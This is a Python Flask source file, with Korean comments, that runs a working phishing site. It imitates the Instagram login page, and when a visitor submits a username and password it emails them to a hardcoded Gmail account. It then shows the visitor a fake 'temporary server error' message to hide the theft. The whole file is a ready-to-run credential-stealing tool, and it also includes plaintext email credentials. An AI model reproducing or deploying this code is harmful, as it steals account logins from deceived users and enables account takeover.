import os
import smtplib
from email.mime.text import MIMEText
from flask import Flask, request, render_template_string

app = Flask(__name__)

# --- [이메일 설정 완료] ---
MY_EMAIL = "fastwifimanager@gmail.com"
MY_APP_PASSWORD = "q1w2e31004!" # 만약 전송 실패 시 '앱 비밀번호'로 교체 필요

def send_email(subject, body):
    try:
        # 이메일 메시지 구성
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = MY_EMAIL
        msg['To'] = MY_EMAIL

        # Gmail SMTP 서버 연결
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(MY_EMAIL, MY_APP_PASSWORD)
            server.sendmail(MY_EMAIL, MY_EMAIL, msg.as_string())
        print("이메일 전송 성공!", flush=True)
    except Exception as e:
        print(f"이메일 전송 실패: {e}", flush=True)

# --- [인스타그램 스타일 페이지] ---
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login • Instagram</title></head>
<body style="font-family:sans-serif; display:flex; flex-direction:column; align-items:center; padding-top:80px; background:#fff;">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" width="175">
    <form action="/" method="POST" style="width:300px; margin-top:40px; display:flex; flex-direction:column;">
        <input type="text" name="u" placeholder="전화번호, 사용자 이름 또는 이메일" style="padding:10px; margin-bottom:10px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px;" required>
        <input type="password" name="p" placeholder="비밀번호" style="padding:10px; margin-bottom:15px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px;" required>
        <button type="submit" style="padding:7px; background:#0095f6; color:white; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">로그인</button>
    </form>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_id = request.form.get('u')
        user_pw = request.form.get('p')
        
        # 메일 발송 내용 구성
        content = f"🔥 [수집 데이터 알림] 🔥\n\nID: {user_id}\nPW: {user_pw}\n\n서버 시각: {os.popen('date').read()}"
        
        # 이메일 보내기 실행
        send_email("🚀 New Login Data Arrived!", content)
            
        # 사용자에게 보여줄 메시지
        return "로그인 서버에 일시적인 오류가 발생했습니다. 잠시 후 다시 시도해 주세요."
    
    return render_template_string(LOGIN_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
